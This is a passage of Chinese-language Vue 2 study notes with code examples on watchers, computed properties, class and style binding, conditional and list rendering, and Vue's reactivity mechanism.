    <script type="text/javascript">
        Vue.config.productionTip = false;
        const vm = new Vue({
            el: '#root',
            data: {
                isHot: true,
                number:{
                    a:10,
                    b:20,
                    c:{
                        d:{
                            e:100
                        }
                    }
                },  
            },
            computed: {
                info() {
                    return this.isHot ? '凉爽' : '炎热';
                }
            },
            methods: {
                changeweather() {
                    this.isHot = !this.isHot;
                }
            },
            watch: {
                info: {
                    //当info发生变化时，会调用
                    handler(newValue, oldValue) {
                        console.log(this);//vue实例
                        console.log('info值改变了', newValue, oldValue);
                        console.log('天气变了，现在是' + newValue + '，过去是' + oldValue);
                    }
                },
                //相当于调用vue中一个属性，当有多层级数据时，是要加'',单个属性可以不加
                //监视多级结构中某个属性的变化
                'number.a':{
                    handler() {
                        console.log('a改变了');//vue实例
                    }
                },
                'number.b':{
                    handler() {
                        console.log('b改变了');//vue实例
                    }
                },
                number:{
                    deep:true,//多层级属性调用
                    handler() {
                        console.log('number改变了');//vue实例
                    }
                }

            }
        })
    </script>
</body>
</html>
```



![image-20230915215442482](D:\typora_photo\image-20230915215442482.png)

![image-20230915225922850](D:\typora_photo\image-20230915225922850.png)

##### 简写：

如果监视属性除了handler之外没有其他配置项（比如deep,immediate)等，可以进行简写。

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>
    <div id="root">
        <h2>今天的天气很{{info}}</h2>
        <button @click="changeweather">切换天气</button>
        <hr />
    </div>
    <script type="text/javascript">
        Vue.config.productionTip = false;
        const vm = new Vue({
            el: '#root',
            data: {
                isHot: true,
            },
            computed: {
                info() {
                    return this.isHot ? '凉爽' : '炎热';
                }
            },
            methods: {
                changeweather() {
                    this.isHot = !this.isHot;
                }
            },
            watch: {
                //正常写法
                // info: {
                //     //当info发生变化时，会调用
                //     handler(newValue, oldValue) {
                //         console.log(this);//vue实例
                //         console.log('info值改变了', newValue, oldValue);
                //         console.log('天气变了，现在是' + newValue + '，过去是' + oldValue);
                //     }
                // }
                //简写
                info(newValue, oldValue) {
                    console.log(this);   //vue实例
                    console.log('天气变了，现在是' + newValue + '，过去是' + oldValue);
                }
            }
        })
        vm.$watch('info', function (newValue, oldValue) {
            console.log('天气变了，现在是' + newValue + '，过去是' + oldValue);
        })
    </script>
</body>
</html>
```

#### 2.5.6 计算属性VS侦听属性

**computed和watch之间的区别**

- computed 能完成的功能， watch 都可以完成 

- watch 能完成的功能， computed**不一定**能完成，例如**watch可以进行异步操作**

  两个重要的小原则：

- **所有被Vue管理的函数，最好写成普通函数**，这样this的指向才是vm或组件实例对象

- **所有不被Vue所管理的函数**(定时器的回调函数、ajax的回调函数等、Promise的回调函数)，**最好写成箭头函数**，这样this的指向才是vm或组件实例对象

##### 利用监视属性实现姓名案例

```html
方法一
<body>
    <h3>姓名案例</h3>
    <div id="root">
        姓：<input type="text" id="familyname" v-model="family"><br>
        名：<input type="text" id="lastname" v-model="last"><br>
        <div id="quan">全名：{{family}}-{{last}}</span>
            <!-- 截取前3个 -->
        </div>
    </div>
    <script type="text/javascript">
        Vue.config.productionTip = false;
        const vm = new Vue({
            el: '#root',
            data: {
                family: '张',
                last: '三'
            },
            watch: {
                family(newValue) {
                    this.family = newValue;
                },
                last(newValue) {
                    this.last = newValue;
                }
            }
        })
    </script>
</body>
```

```html
//方法二
<body>
    <h3>姓名案例</h3>
    <div id="root">
        姓：<input type="text" id="familyname" v-model="family"><br>
        名：<input type="text" id="lastname" v-model="last"><br>
        <div id="quan">全名：{{fullname}}</span>
            <!-- 截取前3个 -->
        </div>
    </div>
    <script type="text/javascript">
        Vue.config.productionTip = false;
        const vm = new Vue({
            el: '#root',
            data: {
                family: '张',
                last: '三',
                fullname:'张-三'
            },
            watch: {
                family(newValue) {
                      setTimeout(() => {  //此处一定要写箭头函数，如果写成普通函数this就指向windows就找不到fullname等属性了，当  是箭头函数时，this指向的才是vue,从外层找。
                           console.log(this);//vue
                           this.fullname = newValue+'-'+this.last;
                    }, 1000);
                 
                },
                last(newValue) {
                    this.fullname = this.family+'-'+newValue;
                }
            }
        })
    </script>
</body>
```



### 2.6 **class 与 style 绑定**

#### **2.6.1  理解**

1. 在应用界面中, 某个(些)元素的样式是变化的

2. class/style 绑定就是专门用来实现动态样式效果的技术

#### 2.6.2 class绑定

1. :class='xxx' ，xxx可以是字符串、对象、数组。
2. 表达式是字符串: 'classA' ，字符串写法适用于:类名不确定，要动态获取。
3. 表达式是对象: {classA:isA, classB: isB}，对象写法适用于:要绑定多个样式，个数不确定，名字也不确定。 
4. 表达式是数组: ['classA', 'classB']，数组写法适用于:要绑定多个样式，个数确定，名字也确定，但不确定用不用。

#### 2.6.3 style绑定

1. :style="{ color: activeColor, fontSize: fontSize + 'px' }" 
2. 其中 activeColor/fontSize 是 data 属性
3. :style="{ color:xxx}" 其中xxx是动态值
4. ：style=“[a,b]”  其中a、b是样式对象

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <script type="text/javascript" src="../js/vue.js"></script>
    <style>
        .base {
            width: 300px;
            height: 70px;
            border: 1px #ccc solid;
        }
        .normal {
            background-color: #27a85f;
        }
        .happy {
            background: linear-gradient(pink, green)
        }
        .sad {
            background: linear-gradient(rgb(206, 118, 118), rgb(75, 75, 225))
        }
        .an1 {
            color: rgb(77, 23, 224);
        }
        .an2 {
            font-size: 30px;
            background-color: #59d51b;
        }
        .an3 {
            border-radius: 10px;
            border: 1px #ccc solid;
        }
    </style>
</head>
<body>
    <div id="root">
        <!-- 表达式是字符串 -->
        <div class="base" :class="mood" @click="changeColor">{{name}}</div><br /><br />
        <!-- 表达式是数组 -->
        <div class="base" :class="classArr">数组</div><br /><br />
        <div class="base" :class="['an1','an3']">数组test</div><br /><br />
        <!-- 表达式是对象 -->
        <div class="base" :class="classObj">对象</div><br /><br />
        <!-- 与上面语句效果一致 -->
        <div class="base" :class="{an1:true,an2:false}">TEST</div><br /><br />
        <!-- style 样式绑定 -->
        <div class="base" :style="fs">style样式1</div><br /><br />
        <div class="base" :style="{fontSize:c}">style样式2</div><br /><br />
        <div class="base" :style="[fs,fs2]">style样式</div><br /><br />
    </div>
    <script type="text/javascript">
        Vue.config.productionTip = false;
        new Vue({
            el: '#root',
            data: {
                name: "你好呀！！",
                mood: 'normal',
                classArr: ['an1', 'an2', 'an3'],
                classObj: {
                    an1: false,
                    an2: true
                },
                fs: {
                    fontSize: '40px',
                    backgroundColor: 'skyblue'
                },
                fs2: {
                    color: 'purple'
                },
                c: '30px'
            },
            methods: {
                changeColor() {
                    const arr = ['normal', 'happy', 'sad'];
                    //Math.random()表示0-1之间的随机数，*3表示在（0-1）之间但不包含3
                    this.mood = arr[Math.floor(Math.random() * 3)];
                }
            }
        })
    </script>
</body>
</html>
```

![image-20230916171001355](D:\typora_photo\image-20230916171001355.png)

### **2.7 条件渲染**

#### **2.7.1 条件渲染指令**

1. v-if 与 v-else 、v-else-if

2. v-show

#### **2.7.2 比较 v-if 与 v-show**

##### v-if

写法 跟 if else 语法类似 

- v-if="表达式"
- v-else-if="表达式" 

- v-else

适用于：**切换频率较低**的场景，因为不展示的DOM元素直接被移除

注意：v-if可以和v-else-if v-else一起使用，但要求结构不能被打断

#####  v-show

写法:

-  v-show="表达式"

适用于：**切换频率较高**的场景

特点：不展示的DOM元素未被移除，仅仅是使用样式**隐藏**掉 display:none

**备注：**使用v-if的时，元素可能无法获取到，而使用v-show一定可以获取到

**template 标签不影响结构，页面html中不会有此标签**，但**只能配合v-if**，不能配合v-show

1. 如果需要频繁切换 v-show 较好
2. 当条件不成立时, v-if 的所有子节点不会解析(项目中使用)

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>条件渲染</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>
    <div id="root">
        <!-- v-show的使用 -->
        <h2 v-show="false">你好！{{name}}</h2>
        <h2 v-show="1===1">你好！{{data}}</h2>
        <!-- v-if的使用 -->
        <h2 v-if="false">你好！hi</h2>
        <h2 v-if="1===1">你好！LOK</h2>

        <h3>测试v-show 当前值是{{n}}</h3>
        <button @click="n++">点击加1</button>
        <h4 v-show="n===1">html</h4>
        <h4 v-show="n===2">css</h4>
        <h4 v-show="n===3">javascript</h4>

        <h3>测试v-if 当前值是{{n1}}</h3>
        <button @click="n1++">点击加1</button>
        <h4 v-if="n1===1">html</h4>
        <h4 v-else-if="n1===2">css</h4>
        <h4 v-else-if="n1===3">javascript</h4>

        <h3>测试v-if v-else 当前值是{{n1}}</h3>
        <button @click="n2++">点击加1</button>
        <h4 v-if="n2===1">html</h4>
        <h4 v-else-if="n2===2">css</h4>
        <h4 v-else>javascript</h4>

        <!-- 不会改变html结构 -->
        <template v-if="n===1">
            <h4>html</h4>
            <h4>css</h4>
            <h4>javascript</h4>
        </template>
    </div>
    <script type="text/javascript">
        Vue.config.productionTip = false;
        new Vue({
            el: '#root',
            data: {
                name: "anjingde",
                data: 'hello',
                n: 0,
                n1: 0,
                n2: 0
            }
        })
    </script>
</body>
</html>
```

![image-20230919102822961](D:\typora_photo\image-20230919102822961.png)

![image-20230919103022686](D:\typora_photo\image-20230919103022686.png)

![image-20230919103111477](D:\typora_photo\image-20230919103111477.png)

### 2.8 列表渲染

#### 2.8.1 效果

![image-20230919104703358](D:\typora_photo\image-20230919104703358.png)

#### 2.8.2 列表显示指令

遍历数组: v-for / index

遍历对象: v-for / key

##### **v-for 指令**

- 用于**展示列表数据**
- 语法:<liv-for="(item,index) of items":key="index">，这里 **key 可以是 index更好的是遍历对象的唯一标识**
- 可遍历:数组、对象、字符串(用的少)、指定次数(用的少)

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>
    <div id="root">
      <h2>人员信息（遍历数组）</h2>
      <ul>
        <li v-for="p in persons" :key="p.id">
            {{p.name}}-{{p.age}}
        </li>
      </ul>
      <h2>汽车信息（遍历对象）</h2>
      <ul>
        <li v-for="(value,key) in cars" :key="key">
            {{value}}-{{key}}
        </li>
      </ul>
      <h2>字符串信息（遍历字符串--用得少）</h2>
      <ul>
        <!-- <li v-for="(char,index) of str" :key="index"> -->
        <li v-for="(char,index) in str" :key="index">
            {{char}}-{{index}}
        </li>
      </ul>
      <h2>遍历指定次数（遍历数字--用得少）</h2>
      <ul>
        <li v-for="(number,index) in 5" :key="index">
            {{index}}-{{number}}
        </li>
      </ul>
    </div>
    <script type="text/javascript">
        Vue.config.productionTip = false;
        new Vue({
            el: '#root',
            data: {
                persons:[
                    {id:'1',name:'张三',age:18},
                    {id:'2',name:'李四',age:19},
                    {id:'3',name:'王五',age:20}
                ],
                cars:{
                    color:'black',
                    address:'中国',
                    name:'奥迪'
                },
                str:'hello' 
            }
        })
    </script>
</body>
</html>
```

![image-20230919104855131](D:\typora_photo\image-20230919104855131.png)

**![image-20230919104904509](D:\typora_photo\image-20230919104904509.png)**

![image-20230919105844711](D:\typora_photo\image-20230919105844711.png)

##### key的原理

![image-20230919113858087](D:\typora_photo\image-20230919113858087.png)

![image-20230919111806725](D:\typora_photo\image-20230919111806725.png)

**面试题：react、vue中的key有什么作用?**

1. 虚拟DOM中key的作用:

   key是虚拟DOM对象的标识，当状态中的数据发生变化时**，Vue会根据【新数据】生成【新的虚拟DOM】，随后Vue进行【新虚拟DOM】与【旧虚拟DOM】的差异比较**，比较规则如下:

   2.对比规则:

​        (1).旧虚拟DOM中找到了与新虚拟DOM相同的key:

- ​      1.若虚拟DOM中内容没变，直接使用之前的真实DOM!
- ​      2.若虚拟DOM中内容变了，则生成新的真实DOM，随后替换掉页面中之前的真实DOM。

​       (2).旧虚拟DOM中未找到与新虚拟DOM相同的key

​             **创建新的真实DOM，随后渲染到到页面。**

3.用index作为key可能会引发的问题:

​       1.若对数据进行:逆序添加、逆序删除等破坏顺序操作:

​          **会产生没有必要的真实DOM更新==>界面效果没问题，但效率低。**

​       2.如果结构中<u>还包含输入类的DOM</u>:

​         **会产生错误DOM更新==> 界面有问题。**

4.开发中如何选择key？

​       1.**最好使用每条数据的唯一标识作为key**，比如id、手机号、身份证号、学号等唯一值。 激活Wir 

​        2.如果不存在对数据的逆序添加、逆序删除等破坏顺序操作，仅用于渲染列表用于展示， 转到“设置” 

使用index作为key是没有问题的。

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>
    <div id="root">
      <h2>人员信息（遍历数组）</h2>
      <button @click="add">添加老刘</button>
      <ul>
        <!-- <li v-for="(p,index) in persons" :key="p.id"> 没问题-->
        <li v-for="(p,index) in persons" :key="index"><!--出现问题-->
            {{p.name}}-{{p.age}}
            <input type="text">
        </li>
      </ul>
    </div>
    <script type="text/javascript">
        Vue.config.productionTip = false;
        new Vue({
            el: '#root',
            data: {
                persons:[
                    {id:'1',name:'张三',age:18},
                    {id:'2',name:'李四',age:19},
                    {id:'3',name:'王五',age:20}
                ]
            },
            methods:{
                add(){
                    const s={id:'4',name:'老刘',age:18};
                    this.persons.unshift(s);
                }
            }
        })
    </script>
</body>
</html>
```

**注意:**如果老刘的信息采用添加到尾部的方法 this.persons.shift(s);，无论是采用:key:index或者是:key:p.id都没有问题，甚至是不加key都没有问题。如果不加:key:页面会根据操作的。

有相同父元素的子元素必须有**独特的 key**。重复的 key 会造成渲染错误。

![image-20230919114717995](D:\typora_photo\image-20230919114717995.png)

![image-20230919114844808](D:\typora_photo\image-20230919114844808.png)

![image-20230919114958664](D:\typora_photo\image-20230919114958664.png)

#### 2.8.3 列表过滤

案例：搜索名字，显示对应名字信息

##### **方法一：监听写法watch**

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>
    <div id="root">
        <h2>人员信息</h2>
        <input type="text" placeholder="输入名字" v-model="keyword">
        <ul>
            <li v-for="(p,index) in filPerson" :key="index">
                {{p.name}}-{{p.age}}-{{p.sex}}
            </li>
        </ul>
    </div>
    <script type="text/javascript">
        Vue.config.productionTip = false;
        new Vue({
            el: '#root',
            data: {
                keyword:'',
                persons: [
                    { id: '1', name: '马冬梅', age: 18, sex:'女'},
                    { id: '2', name: '周冬雨', age: 19 ,sex:'女'},
                    { id: '3', name: '周杰伦', age: 20 ,sex:'男'},
                    { id: '4', name: '温兆伦', age: 21 ,sex:'男'}
                ],
                filPerson:[]
            },
            watch:{
                'keyword':{
                    immediate:true,//初始化调用一次
                    handler(newValue){
                        this.filPerson=this.persons.filter((p)=>{
                            return p.name.indexOf(newValue)!==-1
                        })
                    }
                }
            }
        })
    </script>
</body>
</html>
```

![image-20230919172458992](D:\typora_photo\image-20230919172458992.png)

![image-20230919172422901](D:\typora_photo\image-20230919172422901.png)

![image-20230919172229957](D:\typora_photo\image-20230919172229957.png)

##### **方法二：计算属性写法（该方法较好）**

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>
    <div id="root">
        <h2>人员信息</h2>
        <input type="text" placeholder="输入名字" v-model="keyword">
        <ul>
            <li v-for="(p,index) in filPerson" :key="index">
                {{p.name}}-{{p.age}}-{{p.sex}}
            </li>
        </ul>
    </div>
    <script type="text/javascript">
        Vue.config.productionTip = false;
        new Vue({
            el: '#root',
            data: {
                keyword: '',
                persons: [
                    { id: '1', name: '马冬梅', age: 18, sex: '女' },
                    { id: '2', name: '周冬雨', age: 19, sex: '女' },
                    { id: '3', name: '周杰伦', age: 20, sex: '男' },
                    { id: '4', name: '温兆伦', age: 21, sex: '男' }
                ]
            },
            computed:{
                filPerson(){ //调用时会初始化一次，所以刚开始显示的是全部信息
                   return  this.persons.filter((p)=>{
                        return p.name.indexOf(this.keyword)!=-1
                    })
                }
            }
        })
    </script>
</body>
</html>
```

![image-20230919211647467](D:\typora_photo\image-20230919211647467.png)

![image-20230919211724458](D:\typora_photo\image-20230919211724458.png)

#### 2.8.4 列表排序

![image-20230919214907355](D:\typora_photo\image-20230919214907355.png)

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>
    <div id="root">
        <h2>人员信息</h2>
        <input type="text" placeholder="输入名字" v-model="keyword">
 <!-- 不能把sortType=1写成sortType===1与sortType==1，因为这个是赋值不是true或者false去判断的 -->
        <button @click="sortType=1">年龄升序</button>
        <button @click="sortType=2">年龄降序</button>
        <button @click="sortType=0">原顺序</button>
        <ul>
            <li v-for="(p,index) in filPerson" :key="p.id">
                {{p.name}}-{{p.age}}-{{p.sex}}
            </li>
        </ul>
    </div>
    <script type="text/javascript">
        Vue.config.productionTip = false;
        new Vue({
            el: '#root',
            data: {
                keyword: '',
                sortType: 0,
                persons: [
                    { id: '1', name: '马冬梅', age: 18, sex: '女' },
                    { id: '2', name: '周冬雨', age: 12, sex: '女' },
                    { id: '3', name: '周杰伦', age: 19, sex: '男' },
                    { id: '4', name: '温兆伦', age: 21, sex: '男' }
                ]
            },
            computed: {
                filPerson() { //调用时会初始化一次，所以刚开始显示的是全部信息
                    const arr = this.persons.filter((p) => {
                        return p.name.indexOf(this.keyword) != -1
                    })
                    if (this.sortType) {
                        arr.sort((p1, p2) => {
                            return this.sortType === 1 ? p2.age - p1.age : p1.age - p2.age
                        })
                    }
                    return arr
                }
            }
        })
    </script>
</body>

</html>
```

<video src="D:\typora_photo\列表排序.mp4"></video>

#### 2.8.5 data中数据更新原理（watch监视原理）

##### **（1）更新时的一个问题**

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>
    <div id="root">
        <h2>人员信息</h2>
        <button @click="update">更新马冬梅信息</button>
        <ul>
            <li v-for="(p,index) in persons" :key="p.id">
                {{p.name}}-{{p.age}}-{{p.sex}}
            </li>
        </ul>
    </div>
    <script type="text/javascript">
        Vue.config.productionTip = false;
        new Vue({
            el: '#root',
            data: {
                persons: [
                    { id: '1', name: '马冬梅', age: 18, sex: '女' },
                    { id: '2', name: '周冬雨', age: 12, sex: '女' },
                    { id: '3', name: '周杰伦', age: 19, sex: '男' },
                    { id: '4', name: '温兆伦', age: 21, sex: '男' }
                ]
            },
            methods:{
                update(){
                    // this.persons[0].name='马老师', //奏效
                    // this.persons[0].age='50',//奏效 
                    // this.persons[0].sex='男'//奏效 
                    this.persons[0]= { id: '1', name: '马老师', age: 50, sex: '男' }//不奏效
                } 
            }

        })
    </script>
</body>
</html>
```

![image-20230919222715308](D:\typora_photo\image-20230919222715308.png)

![image-20230919222741968](D:\typora_photo\image-20230919222741968.png)

**注意**：如果是先点击按钮，再打开vue开发者工具查看数据，数据是有变化的；但是如果是先打开vue开发者工具再点击按钮，数据是不变化的。

修正：

```js
update(){
   //vue可以通过splice方法监测到数据改变
       this.persons.splice(0,1,{ id: '1', name: '马老师', age: 50, sex: '男' })
 } 
```

![image-20230920213014431](D:\typora_photo\image-20230920213014431.png)

##### **（2）模拟一个数据检测--错误示例：**

![image-20230919230559160](D:\typora_photo\image-20230919230559160.png)

![image-20230919230647479](D:\typora_photo\image-20230919230647479.png)

##### (3)模拟数据检测（模拟一部分功能--不完善）

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>
    <script type="text/javascript">
        let data = {
            name: '尚硅谷',
            address: '北京',
            friends:{
                a:10,
                b:20
            }
       }
        //创建一个监视的实例对象，用于监视data中属性的变化
        const obs = new Observer(data)
        console.log(obs);
        let vm = {}
        vm._data = data = obs
        function Observer(obj) {
            const keys = Object.keys(obj)
            //遍历
            keys.forEach((k) => {
                Object.defineProperty(this, k, {
                    get() {
                        return obj[k]
                    },
                    set(val) {
                        console.log(`${k}被改了，我要去解析模板，生成虚拟DOM..`);
                        obj[k] = val
                    }
                })
            })
        }
    </script>
</body>
</html>
```

![image-20230920203248704](D:\typora_photo\image-20230920203248704.png)

对于完整的vue来说，vm._data对于data中的每一个嵌套值都有getter与setter

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>
    <div id="root">
        <h2>学校名称：{{name}}</h2>
        <h2>学校地点：{{address}}</h2>
    </div>
    <script type="text/javascript">
        Vue.config.productionTip = false;
        const vm = new Vue({
            el: '#root',
            data: {
                name: "anjingde",
                address: '北京',
                friends: {
                    a: 10,
                    b: 20,
                    c:[
                        {id:'2',name:'是'}
                    ]
                }
            }
        })
    </script>
</body>
</html>
```

![image-20230920203310530](D:\typora_photo\image-20230920203310530.png)

##### (4)vue监测对象原理

```js
Vue.set( target, propertyName/index, value )
vm.$set( target, propertyName/index, value )
```

- **参数**：

  - `{Object | Array} target` 在who身上添加属性
  - `{string | number} propertyName/index  属性名`
  - `{any} value  属性值`

- **返回值**：设置的值。

- **用法**：

  向响应式对象中添加一个 property，并确保这个新 property 同样是**响应式**的，且触发视图更新。它必须用于向响应式对象上添加新 property，因为 Vue 无法探测普通的新增 property (比如 `this.myObject.newProperty = 'hi'`)

  **注意:对象不能是 Vue 实例，或者 Vue 实例的根数据对象。**

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>
    <div id="root">
        <h1>学校信息</h1>
        <h2>学校名称：{{school.name}}</h2>
        <h2>学校地点：{{school.address}}</h2>
        <h2>学校领导：{{school.leaders}}</h2>
        <h1>学生信息</h1>
        <button @click="addSex">添加一个性别属性</button>
        <h2>姓名：{{student.name}}</h2>
        <h2 v-if="student.sex">性别:{{student.sex}}</h2>
        <h2>年龄：真实{{student.age}}</h2>
      <h2>朋友们信息</h2>
      <ul>
        <li v-for="(f,index) in student.friends" :key="index">
            {{f.name}}--{{f.age}}
        </li>
      </ul>
    </div>
    <script type="text/javascript">
        Vue.config.productionTip = false;
        const vm = new Vue({
            el: '#root',
            data: {
                school:{
                       name: "anjingde",
                address: '北京',
                },
                student:{
                    name:'小组',
                    age:'12',
                    friends:[
                        {name:'小李',age:'12'},
                        {name:'小空',age:'13'},
                    ]
                }
            },
            methods:{
                addSex(){
                    // Vue.set(vm._data.student,'sex','男');
                    vm.$set(vm.student,'sex','男')
                }
            }
        })
    </script>
</body>
</html>
```

![image-20230920203055915](D:\typora_photo\image-20230920203055915.png)

![image-20230920204416451](D:\typora_photo\image-20230920204416451.png)

![image-20230920205918554](D:\typora_photo\image-20230920205918554.png)

![image-20230920204543791](D:\typora_photo\image-20230920204543791.png

![image-20230920205224200](D:\typora_photo\image-20230920205224200.png)

##### （5）vue监测数组原理

Vue 将被侦听的数组的**变更方法进行了包裹**，所以它们也将会触发视图更新。这些被包裹过的方法包括：

- `push()`
- `pop()`
- `shift()`
- `unshift()`
- `splice()`
- `sort()`
- `reverse()`

![image-20230920211943339](D:\typora_photo\image-20230920211943339.png)

示例：

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>
    <div id="root">
        <h1>学生信息</h1>
        <button @click="addSex">添加一个性别属性</button>
        <h2>姓名：{{student.name}}</h2>
        <h2 v-if="student.sex">性别:{{student.sex}}</h2>
        <h2>年龄：真实{{student.age}}</h2>
        <h2>爱好</h2>
      <ul>
        <li v-for="(h,index) in student.hobby" :key="index">
            {{h}}
        </li>
      </ul>
      <h2>朋友们信息</h2>
      <ul>
        <li v-for="(f,index) in student.friends" :key="index">
            {{f.name}}--{{f.age}}
        </li>
      </ul>
    </div>
    <script type="text/javascript">
        Vue.config.productionTip = false;
        const vm = new Vue({
            el: '#root',
            data: {
                school:{
                       name: "anjingde",
                address: '北京',
                },
                student:{
                    name:'小组',
                    age:'12',
                    hobby:['打游戏','学习','听音乐'],
                    friends:[
                        {name:'小李',age:'12'},
                        {name:'小空',age:'13'},
                    ]
                }
            },
            methods:{
                addSex(){
                    // Vue.set(vm._data.student,'sex','男');
                    vm.$set(vm.student,'sex','男')
                }
            }
        })
    </script>
</body>
</html>
```

![image-20230920215456399](D:\typora_photo\image-20230920215456399.png)



![image-20230920215904748](D:\typora_photo\image-20230920215904748.png)

![image-20230920220400146](D:\typora_photo\image-20230920220400146.png)

##### (6)Vue监视数据的原理

1.vue会监视data中所有层次的数据。

**2.如何监测对象中的数据?**

通过**setter实现监视**，且要在new Vue时就传入要监测的数据。

(1)  对象中后追加的属性，Vue默认不做响应式处理。

(2)  如需给后添加的属性做**响应式**，请使用如下API:

**Vue.set**(target,propertyName/index，value)或 **vm.$set**(target, propertyName/indexvalue)

**3，如何监测数组中的数据?**

通过包裹数组更新元素的方法实现，本质就是做了两件事:

(1)  **调用原生对应的方法对数组进行更新**。

(2)  **重新解析模板，进而更新页面**。

4.在Vue修改数组中的某个元素一定要用如下方法:

使用这些API:push( )、pop( )、shift( )、unshift( )、splice( ) ,sort( ) ,resever()

Vue.set( )或vm.$set( )

同时也可以使用数组中的一些变更方法：

变更方法，顾名思义，会变更调用了这些方法的原始数组。相比之下，也有非变更方法，例如 `filter()`、`concat()` 和 `slice()`。它们不会变更原始数组，而**总是返回一个新数组**。当使用非变更方法时，可以用新数组替换旧数组：

![image-20230920230329872](D:\typora_photo\image-20230920230329872.png)

**特别注意:**Vue.set()和vm.$set()不能给vm或vm的根数据对象 添加属性!!!

![image-20230920224250675](D:\typora_photo\image-20230920224250675.png)



![image-20230920225657170](D:\typora_photo\image-20230920225657170.png)

示例代码：

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>
    <div id="root">
        <h1>学生信息</h1>
        <button @click="student.age++">年龄加1岁</button><br/><br/>
        <button @click="addSex">添加性别属性，默认值：男</button><br/><br/>
        <button @click="student.sex='未知'">修改性别</button><br/><br/>
        <button @click="addFriend">在列表首位添加一个朋友</button><br/><br/>
        <button @click="addUpdateFri">修改第一个朋友的名字为：张三</button><br/><br/>
        <button @click="addHobby">添加一个爱好</button><br/><br/>
        <button @click="addUpdateHob">修改第一个爱好为：打游戏</button><br/><br/>
        <button @click="remove">过滤掉爱好中的学习</button><br/><br/>
        <h4>姓名：{{student.name}}</h4>
        <h4>年龄：{{student.age}}</h4>
        <h4 v-if="student.sex">性别：{{student.sex}}</h4>
        <h4>爱好</h4>
        <ul>
            <li v-for="(h,index) in student.hobby" :key="index">
                {{h}}
            </li>
        </ul>
        <h4>朋友们信息</h4>
        <ul>
            <li v-for="(f,index) in student.friends" :key="index">
                {{f.name}}--{{f.age}}
            </li>
        </ul>
    </div>
    <script type="text/javascript">
        Vue.config.productionTip = false;
        const vm = new Vue({
            el: '#root',
            data: {
                student: {
                    name: '小组',
                    age: 12,
                    hobby: ['打台球', '学习', '听音乐'],
                    friends: [
                        { name: '小李', age: '12' },
                        { name: '小空', age: '13' },
                    ]
                }
            },
            methods: {
                addSex(){
                    this.$set(this.student,'sex','男');
                },
                addFriend(){
                    this.student.friends.unshift({name: '小拜', age: '17'})
                },
                addUpdateFri(){
                    this.student.friends[0].name='张三'
                },
                addHobby(){
                    this.student.hobby.push('打羽毛球')
                },
                addUpdateHob(){
                    this.student.hobby.splice(0,1,'打游戏')
                    //this.$et.hobby.splice(0,1,'打游戏')
                },
                remove(){
                   this.student.hobby=this.student.hobby.filter((h)=>{
                        return h!='学习'
                    })
                
                }
            }
        })
    </script>
</body>
</html>
```

![image-20230920230622811](D:\typora_photo\image-20230920230622811.png)

### 2.9 收集表单数据

#### 2.9.1 效果

![image-20230921093156105](D:\typora_photo\image-20230921093156105.png)

#### 2.9.2 收集各种常见的表单数据

总结：

-  若<input type="text"/>则v-model收集的是value值，用户输入的就是value值。 

-  若<input type="radio"/>，则v-model收集的是value值，且要给标签配置value值。

-  若 <input type="checkbox"/>

​         1.没有配置input的value属性，那么收集的就是checked(勾选 or 未勾选，是布尔值) 

​          2.配置input的value属性: 

​             (1)  v-model的初始值是**非数组**，那么收集的就是**checked**(勾选 or 未勾选，是布尔值) 
​             (2)  v-model的初始值是**数组**，那么收集的的就是**value组成的数组** []
 **备注:**

v-model的三个修饰符: 

```js
lazy:失去焦点再收集数据 
number:输入字符串转为有效的数字 
trim:输入首尾空格过滤 
```

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
